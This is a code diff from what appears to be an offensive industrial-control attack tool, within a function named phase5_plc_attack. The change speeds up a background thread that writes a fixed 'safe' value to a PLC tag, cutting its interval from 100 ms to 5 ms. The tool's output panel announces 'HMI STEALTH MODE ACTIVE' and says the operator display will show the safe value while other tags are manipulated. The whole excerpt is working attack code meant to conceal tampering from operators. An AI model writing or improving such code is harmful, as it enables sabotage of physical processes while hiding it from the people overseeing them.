@@ -1478,14 +1478,14 @@ def phase5_plc_attack() -> PhaseResult:
                                         plc_conn.write((tag_name, val))
                                 except Exception:
                                     pass
-                                time.sleep(0.1)
+                                time.sleep(0.005)
 
                         t = threading.Thread(target=_freeze_loop, daemon=True)
                         t.start()
                         console.print(Panel(
                             f"[bold white]Frozen tag :[/bold white] [bold yellow]{freeze_tag}[/bold yellow]\n"
                             f"[bold white]Locked at  :[/bold white] [bold green]{safe_value}[/bold green]\n"
-                            f"[bold white]Interval   :[/bold white] 100 ms\n\n"
+                            f"[bold white]Interval   :[/bold white] 5 ms (Overclocked)\n\n"
                             f"[dim]HMI will display {safe_value} while you manipulate other tags[/dim]",
                             title="[bold magenta] HMI STEALTH MODE ACTIVE [/bold magenta]",
                             border_style="magenta", expand=False,
